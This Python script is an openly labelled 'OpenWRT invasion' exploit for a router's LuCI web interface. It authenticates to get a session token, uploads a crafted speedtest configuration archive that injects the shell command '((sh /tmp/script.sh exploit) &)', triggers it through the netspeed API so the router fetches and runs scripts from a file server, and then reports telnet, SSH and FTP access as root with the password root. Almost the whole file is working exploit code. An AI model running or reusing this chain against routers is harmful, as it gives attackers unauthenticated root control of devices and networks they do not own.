#!/usr/bin/env python3
"""
Performance-optimized OpenWRT invasion exploit.
Includes faster connection checking, HTTP session reuse, and in-memory payload generation.
"""

import os
import shutil
import tarfile
import requests
import sys
import re
import time
import random
import hashlib
import platform
import socket
import argparse
import io
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# Import performance optimizations
try:
    from exploit_performance import (
        ExploitSettings, OptimizedSession, fast_service_check,
        legacy_check_host
    )
except ImportError:
    # Fallback if optimization module not available
    print("Warning: Performance optimizations not available, using legacy mode")
    ExploitSettings = None
    OptimizedSession = None


def create_argument_parser():
    """Create CLI argument parser with performance options."""
    parser = argparse.ArgumentParser(
        description="OpenWRT Invasion Exploit - Performance Optimized",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    parser.add_argument(
        "--router-ip", 
        default="192.168.31.1",
        help="Router IP address"
    )
    
    parser.add_argument(
        "--timeout",
        type=float,
        default=None,
        help="Socket timeout in seconds (auto-detected if not specified)"
    )
    
    parser.add_argument(
        "--retries",
        type=int, 
        default=None,
        help="Number of retry attempts (auto-detected if not specified)"
    )
    
    parser.add_argument(
        "--delay",
        type=float,
        default=None,
        help="Delay between retries in seconds"
    )
    
    parser.add_argument(
        "--stok",
        help="Pre-obtained stok token (skip authentication)"
    )
    
    parser.add_argument(
        "--password",
        help="Router admin password"
    )
    
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose output with timing information"
    )
    
    parser.add_argument(
        "--quiet", "-q", 
        action="store_true",
        help="Suppress non-essential output"
    )
    
    parser.add_argument(
        "--use-github",
        action="store_true",
        help="Use GitHub for file serving instead of local server"
    )
    
    parser.add_argument(
        "--max-wait",
        type=float,
        default=20.0,
        help="Maximum time to wait for services to start"
    )
    
    return parser


class OptimizedExploit:
    """Performance-optimized exploit implementation."""
    
    def __init__(self, args):
        self.args = args
        self.verbose = args.verbose and not args.quiet
        
        # Initialize performance settings
        if ExploitSettings:
            setting_overrides = {}
            if args.timeout is not None:
                setting_overrides['timeout'] = args.timeout
            if args.retries is not None:
                setting_overrides['retries'] = args.retries
            if args.delay is not None:
                setting_overrides['delay'] = args.delay
                
            self.settings = ExploitSettings('v1', **setting_overrides)
        else:
            # Fallback settings
            self.settings = type('Settings', (), {
                'timeout': args.timeout or 3.0,
                'retries': args.retries or 3,
                'delay': args.delay or 1.0,
                'connect_timeout': 2.0,
                'read_timeout': 5.0
            })()
        
        # Initialize HTTP session
        if OptimizedSession:
            self.session = OptimizedSession(self.settings)
        else:
            self.session = requests.Session()
        
        self.router_ip = args.router_ip
        self.stok = args.stok
        
        if self.verbose:
            print(f"Initialized with timeout={self.settings.timeout}s, retries={self.settings.retries}")
    
    def log(self, message, force=False):
        """Conditional logging based on verbosity settings."""
        if force or (self.verbose and not self.args.quiet):
            print(f"[{time.strftime('%H:%M:%S')}] {message}")
    
    def time_phase(self, phase_name):
        """Context manager for timing phases."""
        class PhaseTimer:
            def __init__(self, name, logger):
                self.name = name
                self.logger = logger
                self.start_time = None
            
            def __enter__(self):
                self.start_time = time.time()
                self.logger(f"Starting {self.name}...")
                return self
            
            def __exit__(self, exc_type, exc_val, exc_tb):
                elapsed = time.time() - self.start_time
                self.logger(f"Completed {self.name} in {elapsed:.2f}s")
        
        return PhaseTimer(phase_name, self.log)
    
    def get_stok_fast(self):
        """Optimized stok retrieval with caching."""
        cache_file = Path.home() / ".openwrt_cache.json"
        
        # Try to use cached stok if available
        if cache_file.exists() and not self.args.password:
            try:
                with open(cache_file, 'r') as f:
                    cache_data = json.load(f)
                    cached_stok = cache_data.get(self.router_ip, {}).get('stok')
                    if cached_stok:
                        self.log("Using cached authentication token")
                        return cached_stok
            except (json.JSONDecodeError, KeyError):
                pass
        
        with self.time_phase("Authentication"):
            try:
                if hasattr(self.session, 'get'):
                    r0 = self.session.get(f"http://{self.router_ip}/cgi-bin/luci/web")
                else:
                    r0 = self.session.get(f"http://{self.router_ip}/cgi-bin/luci/web", 
                                        timeout=(self.settings.connect_timeout, self.settings.read_timeout))
            except Exception as e:
                self.log(f"Router connection failed: {e}", force=True)
                return None
            
            try:
                mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
            except IndexError:
                self.log("Could not extract device ID from router response", force=True)
                return None
            
            key = re.findall(r'key: \'(.*)\',', r0.text)[0]
            nonce = f"0_{mac}_{int(time.time())}_{random.randint(1000, 10000)}"
            
            # Get password
            if self.args.password:
                router_password = self.args.password
            else:
                router_password = input("Enter router admin password: ")
            
            # Generate auth hash
            account_str = hashlib.sha1((router_password + key).encode('utf-8')).hexdigest()
            password = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
            
            data = f"username=admin&password={password}&logtype=2&nonce={nonce}"
            
            try:
                if hasattr(self.session, 'post'):
                    r1 = self.session.post(
                        f"http://{self.router_ip}/cgi-bin/luci/api/xqsystem/login",
                        data=data,
                        headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
                            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                        }
                    )
                else:
                    r1 = self.session.post(
                        f"http://{self.router_ip}/cgi-bin/luci/api/xqsystem/login",
                        data=data,
                        headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
                            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                        },
                        timeout=(self.settings.connect_timeout, self.settings.read_timeout)
                    )
            except Exception as e:
                self.log(f"Login request failed: {e}", force=True)
                return None
            
            try:
                stok = re.findall(r'\"token\":\"(.*?)\"', r1.text)[0]
                
                # Cache the stok
                cache_data = {}
                if cache_file.exists():
                    try:
                        with open(cache_file, 'r') as f:
                            cache_data = json.load(f)
                    except:
                        pass
                
                if self.router_ip not in cache_data:
                    cache_data[self.router_ip] = {}
                cache_data[self.router_ip]['stok'] = stok
                cache_data[self.router_ip]['timestamp'] = time.time()
                
                with open(cache_file, 'w') as f:
                    json.dump(cache_data, f)
                
                self.log(f"Successfully authenticated, token cached")
                return stok
                
            except IndexError:
                self.log(f"Failed to extract stok from response: {r1.text}", force=True)
                return None
    
    def create_payload_in_memory(self):
        """Create exploit payload in memory without temporary files."""
        with self.time_phase("Payload generation"):
            # Create speedtest config in memory
            try:
                with open("speedtest_urls_template.xml", "rt", encoding="UTF-8") as f:
                    template = f.read()
            except FileNotFoundError:
                self.log("speedtest_urls_template.xml not found", force=True)
                return None
            
            command = "((sh /tmp/script.sh exploit) &)"
            speedtest_data = template.format(
                router_ip_address=self.router_ip,
                command=command
            )
            
            # Create tar.gz in memory
            payload_buffer = io.BytesIO()
            
            with tarfile.open(fileobj=payload_buffer, mode="w:gz") as tar:
                # Add speedtest config
                speedtest_info = tarfile.TarInfo(name="speedtest_urls.xml")
                speedtest_info.size = len(speedtest_data.encode('utf-8'))
                speedtest_info.mtime = int(time.time())
                tar.addfile(speedtest_info, io.BytesIO(speedtest_data.encode('utf-8')))
                
                # Add script
                if os.path.exists("script.sh"):
                    tar.add("script.sh")
                else:
                    self.log("Warning: script.sh not found", force=True)
            
            payload_buffer.seek(0)
            return payload_buffer.getvalue()
    
    def upload_payload_fast(self, payload_data):
        """Upload payload with optimized HTTP session."""
        with self.time_phase("Payload upload"):
            url = f"http://{self.router_ip}/cgi-bin/luci/;stok={self.stok}/api/misystem/c_upload"
            
            files = {"image": ("payload.tar.gz", payload_data, "application/gzip")}
            
            try:
                if hasattr(self.session, 'post'):
                    response = self.session.post(url, files=files)
                else:
                    response = self.session.post(url, files=files, 
                                               timeout=(self.settings.connect_timeout, self.settings.read_timeout))
                
                if response.status_code == 200:
                    self.log("Payload uploaded successfully")
                    return True
                else:
                    self.log(f"Upload failed with status {response.status_code}", force=True)
                    return False
                    
            except Exception as e:
                self.log(f"Upload request failed: {e}", force=True)
                return False
    
    def trigger_exploit(self):
        """Trigger the exploit via netspeed test."""
        with self.time_phase("Exploit trigger"):
            # Determine file server method
            if self.args.use_github:
                port = 0
                self.log("Using GitHub for file serving")
            else:
                # Start local TCP server
                from tcp_file_server import TcpFileServer
                file_server = TcpFileServer("script_tools")
                file_server.run()
                port = file_server.port
                self.log(f"Started local file server on port {port}")
            
            url = f"http://{self.router_ip}/cgi-bin/luci/;stok={self.stok}/api/xqnetdetect/netspeed?{port}"
            
            try:
                if hasattr(self.session, 'get'):
                    response = self.session.get(url)
                else:
                    response = self.session.get(url, timeout=(self.settings.connect_timeout, self.settings.read_timeout))
                
                self.log("Exploit triggered, services starting...")
                return True
                
            except Exception as e:
                self.log(f"Exploit trigger failed: {e}", force=True)
                return False
    
    def wait_for_services(self):
        """Wait for router services using optimized checking."""
        with self.time_phase("Service detection"):
            target_ports = [22, 23, 21]  # SSH, Telnet, FTP
            
            if fast_service_check:
                # Use optimized service checking
                result_port = fast_service_check(
                    self.router_ip, 
                    target_ports, 
                    self.settings
                )
                
                if result_port:
                    service_names = {22: "SSH", 23: "Telnet", 21: "FTP"}
                    self.log(f"{service_names.get(result_port, 'Service')} is ready")
                    return result_port
                else:
                    self.log("No services responded within timeout", force=True)
                    return None
            else:
                # Fallback to legacy checking
                for port in target_ports:
                    if legacy_check_host and legacy_check_host(self.router_ip, port, self.settings):
                        return port
                    elif self.check_port_legacy(port):
                        return port
                
                return None
    
    def check_port_legacy(self, port):
        """Legacy port checking fallback."""
        for i in range(self.settings.retries):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.settings.timeout)
            
            try:
                result = sock.connect_ex((self.router_ip, port))
                sock.close()
                if result == 0:
                    return True
            except:
                pass
            
            if i < self.settings.retries - 1:
                time.sleep(self.settings.delay)
        
        return False
    
    def run_exploit(self):
        """Main exploit execution flow."""
        start_time = time.time()
        
        if not self.args.quiet:
            print("OpenWRT Invasion - Performance Optimized")
            print(f"Target: {self.router_ip}")
            print("=" * 50)
        
        # Get authentication token
        if not self.stok:
            self.stok = self.get_stok_fast()
            if not self.stok:
                self.log("Authentication failed", force=True)
                return False
        
        # Create payload
        payload_data = self.create_payload_in_memory()
        if not payload_data:
            self.log("Payload generation failed", force=True)
            return False
        
        # Upload payload
        if not self.upload_payload_fast(payload_data):
            self.log("Payload upload failed", force=True)
            return False
        
        # Trigger exploit
        if not self.trigger_exploit():
            self.log("Exploit trigger failed", force=True)
            return False
        
        # Wait for services
        available_port = self.wait_for_services()
        
        total_time = time.time() - start_time
        
        if available_port:
            if not self.args.quiet:
                print(f"\n✓ Exploit successful in {total_time:.1f}s!")
                print("Connection options (user: root, password: root):")
                print(f"  • telnet {self.router_ip}")
                print(f"  • ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@{self.router_ip}")
                print(f"  • FTP: Use a GUI client like FileZilla")
            return True
        else:
            self.log(f"Exploit may have succeeded but services not detected (took {total_time:.1f}s)", force=True)
            if not self.args.quiet:
                print(f"Try manual connection: telnet {self.router_ip}")
            return False


def main():
    """Main entry point."""
    parser = create_argument_parser()
    args = parser.parse_args()
    
    # Platform compatibility check (relaxed for Windows)
    if platform.system() == "Windows" and not args.use_github:
        print("Note: Running on Windows. Consider using --use-github flag if local server fails.")
    
    exploit = OptimizedExploit(args)
    success = exploit.run_exploit()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()